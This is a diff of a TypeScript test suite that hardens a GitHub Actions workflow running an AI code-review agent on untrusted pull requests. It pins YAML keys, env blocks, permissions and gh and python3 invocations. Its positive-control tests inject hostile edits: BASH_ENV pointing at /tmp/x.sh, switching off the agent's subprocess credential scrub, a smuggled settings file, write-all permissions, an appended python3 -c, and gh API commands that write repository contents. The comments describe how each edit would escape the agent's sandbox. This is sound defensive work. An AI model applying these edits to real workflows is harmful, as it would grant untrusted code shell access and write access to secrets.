@@ -55,6 +55,25 @@ for (const tool of ['bash', 'git', 'jq', 'awk', 'grep', 'tr', 'mktemp', 'sha256s
 }
 
 /**
+ * A `mktemp` shim, because macOS does not honour `TMPDIR`.
+ *
+ * BSD `mktemp` resolves the Darwin per-user temp dir through `confstr` and ignores `TMPDIR`
+ * outright - `TMPDIR=/x bash -c mktemp` still lands in `/var/folders/.../T`, measured on this
+ * host. The lifted bodies call `mktemp` with no arguments, so pointing `TMPDIR` at the harness's
+ * scratch dir (which the Linux runner does honour, and which is what these harnesses used to
+ * claim was enough on its own) left every one of those files behind on a developer's machine:
+ * one focused run left 111 of them. The shim goes first on PATH and forwards to the real binary,
+ * so the files land in the scratch dir that is removed at the end of each run - on both
+ * platforms, rather than on one.
+ */
+function writeMktempShim(dir: string): void {
+  const real = execFileSync('sh', ['-c', 'command -v mktemp'], { encoding: 'utf8' }).trim();
+  fs.writeFileSync(path.join(dir, 'mktemp'), ['#!/bin/sh', `exec ${real} "$TMPDIR/tmp.XXXXXXXXXX"`].join('\n'), {
+    mode: 0o755,
+  });
+}
+
+/**
  * One `- name: X` step, from its name line up to the next list item at the same indent - or to
  * the end of the file, since the last step in the job has no following step to stop at. The name
  * must match in full (a trailing parenthetical aside is allowed) and must resolve to exactly one
@@ -966,21 +985,96 @@ function mappingEntries(block: string, indent: number, label: string): [string, 
   return entries;
 }
 
+/**
+ * The body of a mapping key (`with:`, `env:`, `claude_args:`, `if:`), lifted by YAML's
+ * indentation rule rather than by a fixed column count and a "deeper than me, empty, or stop"
+ * arm.
+ *
+ * Those two arms stop at a line that is neither deep enough nor blank - and a COMMENT is exactly
+ * that line, because YAML ignores comment lines for structure. A comment indented above the key
+ * column, between the key and the last entry, therefore ended the capture early: everything below
+ * it fell outside the block, `mappingEntries` was handed a well-formed prefix and threw nothing,
+ * and the pin read an under-counted set as an unchanged one. Appending two lines to the `with:`
+ * block - `# trailing note` at the key column, `settings: ./x` one level in - left every key-set
+ * pin in this file green while js-yaml read a fourth key, and `settings` writes
+ * `$HOME/.claude/settings.json`, whose `hooks` block is command execution with `Bash` and every
+ * write tool denied.
+ *
+ * So a block ends at the first non-comment, non-blank line indented at or BELOW its key;
+ * comments and blanks inside it are carried through for the reader to skip. Exactly one key line
+ * at that indent, so a decoy copy cannot be the one that is read.
+ */
+function liftBlock(text: string, key: string, indent: number, label: string): string {
+  const lines = text.split('\n');
+  const head = new RegExp(`^ {${indent}}${key}:(.*)$`);
+  const starts = lines.flatMap((line, index) => (head.test(line) ? [index] : []));
+  expect(starts, `${label}: expected exactly one ${key}: at indent ${indent}`).toHaveLength(1);
+  const body: string[] = [];
+  for (let i = (starts[0] ?? 0) + 1; i < lines.length; i++) {
+    if (/^\s*$/.test(lines[i]) || /^\s*#/.test(lines[i])) {
+      body.push(lines[i]);
+      continue;
+    }
+    if ((lines[i].match(/^ */) ?? [''])[0].length <= indent) break;
+    body.push(lines[i]);
+  }
+  return body.join('\n');
+}
+
+/**
+ * The KEYS of a mapping at one indent, across a whole document or block.
+ *
+ * A thin wrapper over `mappingEntries` so a key-set pin cannot fall back to a bare-token sweep:
+ * `/^ {4}([a-z][a-z-]*):/gm` reads a plain key and nothing else, while YAML reads
+ * `"permissions":` as the same key - so a quoted job-level `permissions: write-all`, inserted
+ * above `runs-on:`, replaced the workflow-level block wholesale and gave `contents: write` to
+ * every step in the job while both key-set sweeps still reported the file unchanged.
+ *
+ * Lines shallower than the requested indent belong to another level and are dropped; a line AT
+ * that indent that is not a key is refused by the reader rather than skipped.
+ */
+function mappingKeysAt(text: string, indent: number, label: string): string[] {
+  const block = text
+    .split('\n')
+    .filter(line => !line.trim() || (line.match(/^ */) ?? [''])[0].length >= indent)
+    .join('\n');
+  return mappingEntries(block, indent, label).map(([key]) => key);
+}
+
 /** The keys of a step's `with:` mapping, in file order. */
 function withKeys(src: string, name: string): string[] {
-  const block = step(src, name).match(/^ {8}with:\n((?: {10}.*\n|\n)+)/m)?.[1];
-  expect(block, `${name}: no with: block`).toBeTruthy();
-  return mappingEntries(block ?? '', 10, `${name} with:`).map(([key]) => key);
+  return mappingEntries(liftBlock(step(src, name), 'with', 8, `${name} with:`), 10, `${name} with:`).map(
+    ([key]) => key
+  );
 }
 
 /** A step's `env:` block as ordered key/value pairs, comment lines dropped. */
 function envPairs(src: string, name: string): [string, string][] {
-  const block = step(src, name).match(/^ {8}env:\n((?: {10}.*\n|\n)+)/m)?.[1];
-  expect(block, `${name}: no env: block`).toBeTruthy();
-  return mappingEntries(block ?? '', 10, `${name} env:`);
+  return mappingEntries(liftBlock(step(src, name), 'env', 8, `${name} env:`), 10, `${name} env:`);
 }
 
 const envKeys = (src: string, name: string) => envPairs(src, name).map(([key]) => key);
+
+/**
+ * Every step's `env:` KEY SET, as one map from step name to keys - `[]` for a step that declares
+ * none, including the agent step.
+ *
+ * `envPairs` was called for exactly two step NAMES, and Actions env precedence is step over job,
+ * so an unread step `env:` overrides the job block pinned by value. Two one-line escapes were
+ * green against that: `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: '0'` added to the agent step (the scrub
+ * is the second line of the no-shell posture, and the key is the same one - only its POSITION
+ * differed from the job-level pin that catches the same edit), and `BASH_ENV: /tmp/x.sh` added to
+ * any other step, which `bash -e {0}` sources before that step's body runs. A pin per step NAME
+ * cannot see either, so the whole map is pinned instead: a key added anywhere, and a block added
+ * to a step that had none, both reach it.
+ */
+const stepEnvKeys = (src: string): [string, string[]][] =>
+  stepChunks(src).map(({ name, body }) => [
+    name,
+    /^ {8}env:$/m.test(body)
+      ? mappingEntries(liftBlock(body, 'env', 8, `${name} env:`), 10, `${name} env:`).map(([key]) => key)
+      : [],
+  ]);
 
 /**
  * The review step's `claude_args:` block tokenised the way the action tokenises it.
@@ -1001,9 +1095,9 @@ const envKeys = (src: string, name: string) => envPairs(src, name).map(([key]) =
  * (`--model`) smuggled a whole `--settings ./x.json` past this pin.
  */
 function claudeArgTokens(src: string, expansion = 'EXPANSION'): string[] {
-  const block = step(src, 'Run /bot-review').match(/^ {10}claude_args: \|\n((?: {12}.*\n|\n)+)/m)?.[1];
+  const block = liftBlock(step(src, 'Run /bot-review'), 'claude_args', 10, 'claude_args');
   expect(block, 'no claude_args block').toBeTruthy();
-  const text = withoutComments(block ?? '').replace(/\$\{\{[\s\S]*?\}\}/g, expansion);
+  const text = withoutComments(block).replace(/\$\{\{[\s\S]*?\}\}/g, expansion);
   const tokens = [...text.matchAll(/(?:"[^"]*"|'[^']*'|\S)+/g)].map(m => m[0]);
   // `shell-quote` treats an unquoted `#` as a comment to the end of the WHOLE STRING, not to
   // the end of its line - the block is one string by then. An inline `#` on the allow-list line
@@ -1189,9 +1283,9 @@ function toolListModes(value: string): { condition: string; fold: string[]; revi
  * gate it disarms, so `toMatch` cannot tell a live gate from a neutralised one.
  */
 function ifConjuncts(src: string, name: string): string[] {
-  const block = step(src, name).match(/^ {8}if: \|\n((?: {10}.*\n)+)/m)?.[1];
-  expect(block, `${name}: no block-scalar if:`).toBeTruthy();
-  return (block ?? '')
+  const stepSrc = step(src, name);
+  expect(stepSrc, `${name}: if: is not a block scalar`).toMatch(/^ {8}if: \|$/m);
+  return withoutComments(liftBlock(stepSrc, 'if', 8, `${name}: if`))
     .replace(/\s+/g, ' ')
     .trim()
     .split('&&')
@@ -1277,11 +1371,19 @@ function runStagedGuards(
       fs.mkdirSync(path.join(fakeHome, '.config', 'git'), { recursive: true });
       fs.writeFileSync(path.join(fakeHome, '.config', 'git', 'attributes'), `${home.attributes}\n`);
     }
-    // TMPDIR inside the scratch dir so the `mktemp` files the lifted region creates are removed
-    // with it. On the host temp dir they accumulate - one focused run left 74 of them behind.
+    // The lifted region's `mktemp` files have to land in the scratch dir removed below. `TMPDIR`
+    // alone does not do it - see `writeMktempShim`, which puts that bound in the one place both
+    // platforms honour.
     const scratchTmp = path.join(dir, 'tmp');
-    fs.mkdirSync(scratchTmp);
-    const env: NodeJS.ProcessEnv = { ...process.env, HOME: fakeHome, TMPDIR: scratchTmp };
+    const bin = path.join(dir, 'bin');
+    for (const scratch of [scratchTmp, bin]) fs.mkdirSync(scratch);
+    writeMktempShim(bin);
+    const env: NodeJS.ProcessEnv = {
+      ...process.env,
+      PATH: `${bin}${path.delimiter}${process.env.PATH ?? ''}`,
+      HOME: fakeHome,
+      TMPDIR: scratchTmp,
+    };
     // Or git reads $XDG_CONFIG_HOME/git/attributes from the DEVELOPER's home instead.
     delete env.XDG_CONFIG_HOME;
     const run = spawnSync('bash', ['-c', script], { cwd: dir, encoding: 'utf8', env, timeout: 120_000 });
@@ -1378,9 +1480,11 @@ function runPushStep(src: string, fixture: PushFixture): PushOutcome {
     const home = path.join(root, 'home');
     const bin = path.join(root, 'bin');
     // `tmp` so the body's two `mktemp` files are removed with the scratch root rather than
-    // accumulating in the host temp dir.
+    // accumulating in the host temp dir, and the shim because `TMPDIR` does not get them there
+    // on macOS - see `writeMktempShim`.
     const tmp = path.join(root, 'tmp');
     for (const dir of [work, home, bin, tmp]) fs.mkdirSync(dir);
+    writeMktempShim(bin);
     const git = (cwd: string, ...args: string[]) =>
       execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], {
         encoding: 'utf8',
@@ -1543,6 +1647,7 @@ function runPostedCheck(src: string, fixture: PostedFixture): string {
   try {
     const bin = path.join(dir, 'bin');
     fs.mkdirSync(bin);
+    writeMktempShim(bin);
     const payload = (entries: PostedEntry[] | undefined, at: 'submitted_at' | 'created_at') =>
       JSON.stringify(
         (entries ?? []).map((entry, i) => ({
@@ -1646,6 +1751,25 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       return blocks[0][0].replace(/\s+#.*$/gm, '').trimEnd();
     };
 
+    // And the file has to be YAML the runner can LOAD, which one spelling in this job does not
+    // survive. A plain scalar may not begin with a YAML indicator, so `if: !cancelled() && ...`
+    // written on ONE line is not an expression at all - it is the tag `!cancelled()`, and the
+    // workflow fails to load with "unknown tag". Every other negation gate here is a block
+    // scalar, which is what kept the class out until a one-line edit was made into one. There is
+    // no YAML parser resolvable from this package (the reason the docblock states for reading
+    // these structures as text), so this is the narrow rule rather than the general one: a
+    // mapping VALUE, on the same line as its key, may not open with an indicator.
+    expect(top.match(/^ +[A-Za-z_-]+: +[!&*%]/gm) ?? [], 'a plain scalar opens with a YAML indicator').toEqual([]);
+    // POSITIVE CONTROL for the rule, in the exact shape that was caught by hand: the review
+    // step's gate written on one line, opening with a negation. The shipped file reads clean
+    // above, so the pair is what makes this a bound rather than a formality.
+    const markerTag = src.replace(
+      "        if: steps.size_check.outputs.skip == 'false' && steps.substantive.outputs.skip == 'false' && steps.skill_fetch.outcome == 'success'\n",
+      "        if: !cancelled() && steps.skill_fetch.outcome == 'success'\n"
+    );
+    expect(markerTag, 'the single-line if: anchor moved').not.toBe(src);
+    expect(withoutComments(markerTag).match(/^ +[A-Za-z_-]+: +[!&*%]/gm) ?? []).toHaveLength(1);
+
     // `pull_request_target` is the single swap that voids every other bound here: it runs with
     // the base repo's secrets while this job checks out and runs an agent over the untrusted PR
     // head. The workflow's own comment forbids it in prose; this is the part that enforces it.
@@ -1662,11 +1786,13 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // A JOB-level `permissions:` replaces the workflow-level block wholesale rather than
     // merging with it, so it reaches `contents: write` for every step in the job without
     // touching the lines pinned just above. Exactly one `permissions:` key, at column 0.
-    // The WHOLE LINE, at any indent: `^ *permissions:$` required end-of-line right after the
-    // colon, so it saw the block form only. A job-level `permissions: {contents: write}` (a
-    // flow mapping is valid YAML and GitHub accepts it), `permissions: write-all`, or the key
-    // with one trailing space each left it green.
-    expect(top.match(/^ *permissions\b.*$/gm)).toEqual(['permissions:']);
+    // The WHOLE LINE, at any indent and through EITHER key spelling. `^ *permissions:$`
+    // required end-of-line right after the colon, so it saw the block form only, and
+    // `^ *permissions\b` still required the key to start with a bare `p` - a job-level
+    // `"permissions": write-all` matched neither and quoted is the same key to YAML. A
+    // `permissions: {contents: write}` flow mapping and a trailing space were the other two
+    // shapes a prefix match waved through.
+    expect(top.match(/^ *["']?permissions["']? *:.*$/gm)).toEqual(['permissions:']);
 
     expect(jobIfConjuncts(src)).toEqual([
       // Fork PRs get no secrets and a read-only token, so this would fail on every one of them;
@@ -1685,23 +1811,15 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // program every `run:` body below is executed BY, and a job-level `container:` moves every
     // step into an image the three absolute `/home/runner/...` write fences are not a premise
     // about - each reaching past every other assertion in this file without disturbing one.
+    //
+    // Read through the SHARED mapping reader, not a bare-token `matchAll`. `/^ {4}
+    // ([a-z][a-z-]*):/gm` reads a plain key and nothing else, so a quoted one reached neither
+    // this sweep nor the `permissions` line above and the job's key set read as unchanged.
     const jobs = top.slice(top.indexOf('\njobs:'));
-    expect([...top.matchAll(/^([a-z][a-z-]*):/gm)].map(m => m[1])).toEqual([
-      'name',
-      'on',
-      'permissions',
-      'concurrency',
-      'jobs',
-    ]);
+    expect(mappingKeysAt(top, 0, 'top-level keys')).toEqual(['name', 'on', 'permissions', 'concurrency', 'jobs']);
     // One job, so the decoy `jobIfConjuncts` refuses cannot arrive as a second job either.
-    expect([...jobs.matchAll(/^ {2}([a-z][a-z0-9-]*):/gm)].map(m => m[1])).toEqual(['review']);
-    expect([...jobs.matchAll(/^ {4}([a-z][a-z-]*):/gm)].map(m => m[1])).toEqual([
-      'if',
-      'runs-on',
-      'timeout-minutes',
-      'env',
-      'steps',
-    ]);
+    expect(mappingKeysAt(jobs, 2, 'job name')).toEqual(['review']);
+    expect(mappingKeysAt(jobs, 4, 'job keys')).toEqual(['if', 'runs-on', 'timeout-minutes', 'env', 'steps']);
     // The job env, by value. `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` strips the Anthropic key and
     // the runner's own Actions credentials out of every subprocess the agent's tools spawn and
     // pins the permission mode to `default`; it is the second line of the no-shell posture, and
@@ -1711,9 +1829,7 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // a key-SET bound, so a reader that under-counts is not a weaker assertion but a false one,
     // and a `"BASH_ENV":` key here would set a variable for every step in the job while a
     // bare-token `matchAll` reported the block unchanged.
-    const jobEnv = /^ {4}env:\n((?: {6}.*\n|\n)*)/m.exec(jobs)?.[1];
-    expect(jobEnv, 'the job env: block moved').toBeTruthy();
-    expect(mappingEntries(jobEnv ?? '', 6, 'job env')).toEqual([
+    expect(mappingEntries(liftBlock(jobs, 'env', 4, 'job env'), 6, 'job env')).toEqual([
       ['CLAUDE_CODE_SUBPROCESS_ENV_SCRUB', "'1'"],
       ['FOLD_MODE', "${{ github.event.label.name == 'bot-fold' }}"],
     ]);
@@ -1722,8 +1838,21 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // rather than as nothing.
     const quotedJobKey = src.replace(/^( {6})FOLD_MODE:/m, `$1"BASH_ENV": /tmp/x.sh\n$1FOLD_MODE:`);
     expect(quotedJobKey, 'the job env injection anchor moved').not.toBe(src);
-    const quotedJobEnv = /^ {4}env:\n((?: {6}.*\n|\n)*)/m.exec(quotedJobKey)?.[1] ?? '';
-    expect(mappingEntries(quotedJobEnv, 6, 'job env').map(([key]) => key)).toContain('BASH_ENV');
+    expect(mappingEntries(liftBlock(quotedJobKey, 'env', 4, 'job env'), 6, 'job env').map(([key]) => key)).toContain(
+      'BASH_ENV'
+    );
+    // And the appended-key axis at this level. Note the block is read from the comment-stripped
+    // `jobs`, so a comment here is inert and the truncation P1-2 filed does NOT reach this reader
+    // - it reaches the two STEP-level ones, which read raw text. Stated rather than left implied,
+    // because with the lift in place a reader that was already immune looks identical to one the
+    // fix repaired.
+    const appendedJobKey = src.replace(/^( {6}FOLD_MODE: .*\n)/m, '$1    # trailing note\n      BASH_ENV: /tmp/x.sh\n');
+    expect(appendedJobKey, 'the job env tail anchor moved').not.toBe(src);
+    expect(mappingEntries(liftBlock(appendedJobKey, 'env', 4, 'job env'), 6, 'job env').map(([key]) => key)).toEqual([
+      'CLAUDE_CODE_SUBPROCESS_ENV_SCRUB',
+      'FOLD_MODE',
+      'BASH_ENV',
+    ]);
     // And a line that is not a key at all is refused rather than dropped.
     expect(() => mappingEntries('      :: not a key\n', 6, 'probe')).toThrow(/not a key/);
   });
@@ -1894,6 +2023,26 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     const quotedWithKey = src.replace(/^( {10})claude_args:/m, `$1"settings": ./probe-settings.json\n$1claude_args:`);
     expect(quotedWithKey, 'the with: injection anchor moved').not.toBe(src);
     expect(withKeys(quotedWithKey, 'Run /bot-review')).toContain('settings');
+    // POSITIVE CONTROL for the block lift, on the axis a "deeper than me or empty" arm is blind
+    // to: a comment indented ABOVE the key column matches neither arm, so the capture ended there
+    // and everything below it fell outside the pin while the reader was handed a well-formed
+    // prefix and threw nothing. Placed AFTER the last shipped key on purpose - a comment higher
+    // up makes a shipped key go missing, which reds loudly and hides the escape this is for.
+    const afterLastWithKey = src.replace(
+      /^( {14}this run just ends, unreviewed, if you do\.\n)/m,
+      '$1        # trailing note\n          settings: ./probe-settings.json\n'
+    );
+    expect(afterLastWithKey, 'the with: tail anchor moved').not.toBe(src);
+    expect(withKeys(afterLastWithKey, 'Run /bot-review')).toContain('settings');
+    // The same control for `claude_args`, whose key is two levels deeper and whose consumer
+    // shell-parses the block: the comment sits at the STEP key column, below the `claude_args:`
+    // key and above the argument column, which is the exact shape that truncated the capture.
+    const afterTurnCap = src.replace(
+      /^( {12}--max-turns 80\n)/m,
+      '$1        # trailing note\n            --settings ./probe-settings.json\n'
+    );
+    expect(afterTurnCap, 'the claude_args tail anchor moved').not.toBe(src);
+    expect(() => assertArgSurface(claudeArgTokens(afterTurnCap))).toThrow();
     assertArgSurface(claudeArgTokens(src));
     // And again with each `${{ }}` standing for several words, one of them a flag. GitHub
     // expands these before the action shell-parses the result, so an UNQUOTED expansion is
@@ -2080,12 +2229,31 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // (`-I`), because `python3 -` puts the process CWD - $GITHUB_WORKSPACE, the checkout the
     // agent holds Edit on - at `sys.path[0]`, so a planted `./json.py` wins the redactor's
     // own `import json`. Authenticating the program's bytes says nothing about either.
-    const pythonInvocations = (
-      runBodies(src)
-        .join('\n')
-        .match(/python3[^\n]*/g) ?? []
-    ).map(text => text.replace(/;.*$/, '').trim());
-    expect(pythonInvocations).toEqual(['python3 -I - "$EXECUTION_FILE" "$SKILL_FILE" "$DEST"']);
+    // By PARSED invocation, not by a line scan. `match(/python3[^\n]*/g)` is non-overlapping, so
+    // `; python3 -c "import os"` appended to the shipped line was INSIDE the first match and then
+    // deleted by the `.replace(/;.*$/,'')` - the second interpreter was invisible, and arbitrary
+    // Python without `-I`, with its program from `-c` rather than from the authenticated object
+    // store, ran in the step holding the full agent transcript. The same words joined with `&&`
+    // were caught, which is what isolated the separator. The program set is the bound, so it is
+    // read as programs.
+    expect(commandsNamed(src, /^python3$/)).toEqual([
+      ['python3', '-I', '-', '$EXECUTION_FILE', '$SKILL_FILE', '$DEST'],
+    ]);
+    // POSITIVE CONTROL along that axis, off the shipped invocation: one mutation GLUES a second
+    // interpreter on after a `;` - the shape the old scan consumed and then deleted - and one
+    // adds it as its own command, which the old scan caught. The pair is what isolates the
+    // separator as the cause rather than the second interpreter.
+    const shippedPython = /^( {17}python3 -I - "\$EXECUTION_FILE" "\$SKILL_FILE" "\$DEST"; then\n)/m;
+    expect(src, 'the python3 invocation anchor moved').toMatch(shippedPython);
+    for (const glued of [true, false]) {
+      const injected = src.replace(shippedPython, (_whole, line: string) =>
+        glued
+          ? line.replace('; then', '; python3 -c "import os"; then')
+          : `${line}                 python3 -c "import os"\n`
+      );
+      expect(injected, `the python3 injection anchor moved (glued=${glued})`).not.toBe(src);
+      expect(commandsNamed(injected, /^python3$/).length, `a second python3 was not seen (glued=${glued})`).toBe(2);
+    }
     // The redactor derives the strings it strips by READING the skill file, so that file
     // is the redaction list, and it lives in the unfenced-by-default $RUNNER_TEMP. It is
     // checked against a hash taken before the agent ran; without this the private skill
@@ -2414,6 +2582,66 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       'Report skill-fetch failure',
       'Remove re-review label',
     ]);
+    // Every step's `env:` KEY SET, as one map. See `stepEnvKeys`: this was read for exactly two
+    // step NAMES, so the agent step - which declares no `env:` block at all - had nothing looking
+    // at one, and any other step could take a key that overrides the job env pinned above. Both
+    // are one-line escapes that change what a step executes without changing its body, which is
+    // the one thing every body-shaped sweep in this file is structurally unable to see.
+    expect(stepEnvKeys(src)).toEqual([
+      ['Checkout PR head', []],
+      ['Size guard - skip oversize PRs, pick review model', ['GH_TOKEN', 'PR', 'REPO']],
+      [
+        'Substantive-change guard - skip changeset-only re-reviews',
+        ['GH_TOKEN', 'BOT_REVIEW_LOGIN', 'CHANGESET_BOT', 'PR', 'REPO'],
+      ],
+      ['Note changeset-only skip on a manual re-review', ['GH_TOKEN', 'PR', 'REPO']],
+      ['Mint b4m-devtools read token', []],
+      ['Fetch bot-review skill from b4m-devtools (fail loud)', ['GH_TOKEN', 'DEST', 'OWNER']],
+      ['Record review start time', []],
+      ['Install bubblewrap', []],
+      ['Run /bot-review', []],
+      ['Verify a review was actually posted', ['GH_TOKEN', 'BOT_REVIEW_LOGIN', 'SINCE', 'REPO', 'PR']],
+      ['Mint fold push token (fold mode only)', []],
+      ['Push fold commit', PUSH_STEP_ENV_KEYS],
+      ['Report fold failure', ['GH_TOKEN', 'MINT_OUTCOME', 'PUSH_REASON', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
+      ['Report cancelled fold', ['GH_TOKEN', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
+      ['Report fold no-op', ['GH_TOKEN', 'PUSHED', 'DROPPED', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
+      [
+        'Redact and upload review transcript',
+        [
+          'EXECUTION_FILE',
+          'SKILL_FILE',
+          'SKILL_SHA',
+          'DEST',
+          'GIT_CONFIG_GLOBAL',
+          'GIT_CONFIG_SYSTEM',
+          'GIT_CONFIG_NOSYSTEM',
+          'GIT_CONFIG_COUNT',
+          'GIT_CONFIG_PARAMETERS',
+          'PYTHONNOUSERSITE',
+        ],
+      ],
+      ['Upload review transcript', []],
+      ['Report incomplete review', ['GH_TOKEN', 'WAKEUP_DETECTED', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
+      ['Report skill-fetch failure', ['GH_TOKEN', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
+      ['Remove re-review label', ['GH_TOKEN', 'PR', 'REPO', 'LABEL']],
+    ]);
+    // POSITIVE CONTROLS, one per position: a key added to a step that already has a block, and a
+    // whole block added to the step that had none.
+    const addedKey = src.replace(/^( {10}CHANGESET_BOT: .*\n)/m, '$1          BASH_ENV: /tmp/x.sh\n');
+    expect(addedKey, 'the step env injection anchor moved').not.toBe(src);
+    expect(stepEnvKeys(addedKey).find(([name]) => name.startsWith('Substantive-change'))?.[1]).toContain('BASH_ENV');
+    // Inserted between the step's `uses:` and its `with:`, which is where a step-level `env:`
+    // block goes and where it reaches one block only - the same two lines after `with:`'s own
+    // keys would be YAML-legal and would make the action's inputs children of `env:` instead.
+    const addedToAgent = src.replace(
+      /^( {8}uses: anthropics\/claude-code-action@v1\n)/m,
+      "$1        env:\n          CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: '0'\n"
+    );
+    expect(addedToAgent, 'the agent env injection anchor moved').not.toBe(src);
+    expect(stepEnvKeys(addedToAgent).find(([name]) => name === 'Run /bot-review')?.[1]).toEqual([
+      'CLAUDE_CODE_SUBPROCESS_ENV_SCRUB',
+    ]);
     // POSITIVE CONTROLS: a new step in every spelling the list item may take. `name:` is optional
     // in the step schema and an unnamed step has blinded four sweeps in this file at once before,
     // so it has to REACH the pin rather than be skipped by it. The last two are the bare `-`
@@ -2645,6 +2873,33 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     skipped.steps.skill_fetch = { outcome: 'failure' };
     skipped.steps.bot_review = { outcome: 'skipped', outputs: {} };
     expect(firing(skipped)).toEqual(['Report skill-fetch failure']);
+
+    // The FIFTH axis that loop holds fixed at `skill_fetch: success`, and the state outside it.
+    // `Report skill-fetch failure` was `always() && outcome == 'failure'`: no `cancelled()` and no
+    // FOLD_MODE guard, so on a cancellation it fired beside `Report cancelled fold`. And the
+    // review step was not gated on the fetch at all, so this comment's own claim - "no review ran"
+    // - was false, and an un-cancelled fetch failure with a review that posted nothing fired
+    // beside `Report incomplete review`. Both halves are bound here: the report is `!cancelled()`
+    // and the review step now requires the fetch to have succeeded, which is what makes its
+    // message true rather than merely reassuring.
+    expect(ifLine(src, 'Run /bot-review')).toBe(
+      "steps.size_check.outputs.skip == 'false' && steps.substantive.outputs.skip == 'false' && steps.skill_fetch.outcome == 'success'"
+    );
+    // As conjuncts off a BLOCK scalar, not a single-line `if:`: a plain YAML scalar may not start
+    // with `!`, so writing this gate on one line is a workflow that will not load at all. The
+    // reader below is what pins it; `ifLine` would silently read a different spelling.
+    expect(ifConjuncts(src, 'Report skill-fetch failure')).toEqual([
+      '!cancelled()',
+      "steps.skill_fetch.outcome == 'failure'",
+    ]);
+    for (const cancelled of [false, true]) {
+      const noSkill = state(cancelled, false, false, false);
+      noSkill.steps.skill_fetch = { outcome: 'failure' };
+      noSkill.steps.bot_review = { outcome: 'skipped', outputs: {} };
+      expect(firing(noSkill), `a failed skill fetch was outside the sweep: cancelled=${cancelled}`).toEqual([
+        cancelled ? 'Report cancelled fold' : 'Report skill-fetch failure',
+      ]);
+    }
   });
 
   it('commits only tracked-file edits, and fails rather than falling through', () => {
@@ -2783,42 +3038,56 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       '*non-fast-forward*',
       '*refusing to allow*',
     ]);
-    // `gh` is treated as data-only by the sweeps above because every call in the file reads.
-    // It does not have to be: `GH_TOKEN="$PUSH_TOKEN" gh api --method PUT
+    // `gh` is treated as data-only by the sweeps above because every call in the file reads, and
+    // `checkoutCodeReferences` exempts it by name. It does not have to read, and the two shapes
+    // that matter name nothing any sweep above looks for. `gh api --method PUT
     // repos/$REPO/contents/<path>` commits a file through the API, routing around the staging
     // sweep, the path guard, the size bound, the non-force and the refspec restriction at once.
-    // Read calls only, so the sweeps' treatment of it stays true.
-    // `(=|$)`, not `$`: `gh` accepts `--method=PUT` as readily as `--method PUT`, and this
-    // file's own `takesValue` logic already treats `--opt=value` as a spelling of the flag, so
-    // the anchored form made the asymmetry internal to this file rather than a limit of `gh`.
+    // `gh release download --output /home/runner/work/_temp/_runner_file_commands/set_env_x`
+    // writes the runner's env file with NO redirection and no runner variable anywhere in the
+    // body: `redirectionTargets` reads redirects, `runnerFileCommandMentions` reads the two
+    // names, and the path here is a literal, so all three read the file unchanged at 31/31.
+    // `$RUNNER_TEMP` is `/home/runner/work/_temp` on the pinned runner, so that step then sets
+    // `BASH_ENV` for `Push fold commit`.
     //
-    // Both halves of the spelling. The long flags are matched with `=` or end-of-word; the SHORT
-    // ones are matched with anything after them, because `gh`'s flag parser (cobra/pflag) accepts
-    // a shorthand's value GLUED to it - `-XPUT`, `-fcontent=y` - and an anchored `(=|$)` reads
-    // those as neither a flag nor a value. Verified against the live CLI, not from memory.
-    const ghWrites = (text: string) =>
-      commandsNamed(text, /^gh$/)
-        .filter(words => words.some(word => /^(-[XfF].*|--(?:method|input|field|raw-field)(?:=|$))/.test(word)))
-        .map(words => words.join(' '));
-    expect(ghWrites(src)).toEqual([]);
-    // POSITIVE CONTROL, along that axis. Every `=`-spelled entry carries NO space-spelled flag:
-    // with `--method=PUT ... -f content=y` the `-f` matches the anchored form too, so the
-    // control passed against the defect it was written for and proved nothing. The last two are
-    // the glued shorthands, which carry no separator for an anchored match to find.
-    for (const spelling of [
-      'gh api --method PUT repos/$REPO/contents/x -f content=y',
-      'gh api --method=PUT repos/$REPO/contents/x --field=content=y',
-      'gh api --raw-field=content=y repos/$REPO/contents/x',
-      "'env' gh api --input=- repos/$REPO/contents/x",
-      'gh api -XPUT repos/$REPO/contents/x -fcontent=y',
-      'gh api -XPOST -Fcontent=@payload repos/$REPO/contents/x',
-    ]) {
+    // Bounded as whole SETS - the subcommand and every flag - rather than as a denylist of the
+    // flag spellings someone thought of. The reach is not a finite list: `--method`/`--input`/
+    // `--field`/`--raw-field` write through the API, `--output`/`--pattern` write files, `gh
+    // extension install <repo>` followed by `gh <ext>` runs a program, and pflag lets a boolean
+    // shorthand cluster ahead of a value-taking one, so `-iXPUT` is `--include --method PUT` with
+    // no separator for an anchored matcher to find. Pinning the sets means a new subcommand, or a
+    // new flag in any spelling, has to be justified here first. The values are deliberately NOT
+    // pinned: every `gh pr comment` carries a long message body that is prose, and pinning prose
+    // would make this a wording check rather than a capability bound. Stated as a residual rather
+    // than left to be found: a VALUE can still be edited, and what bounds that is elsewhere - the
+    // tokens any `gh` call holds are the repo-scoped GITHUB_TOKEN and the b4m-devtools READ token,
+    // and no `gh` runs in the step holding the push token (asserted just below).
+    const ghInvocations = (src: string) => commandsNamed(src, /^gh$/);
+    const ghSubcommands = (src: string) =>
+      [...new Set(ghInvocations(src).map(words => words.slice(1).find(word => !word.startsWith('-')) ?? ''))].sort();
+    const ghFlags = (src: string) =>
+      [...new Set(ghInvocations(src).flatMap(words => words.slice(1).filter(word => word.startsWith('-'))))].sort();
+    expect(ghSubcommands(src)).toEqual(['api', 'pr']);
+    expect(ghFlags(src)).toEqual(['--body', '--jq', '--json', '--paginate', '--remove-label', '--repo']);
+    // POSITIVE CONTROLS, one per reach. The first two were live at 31/31 against a filter that
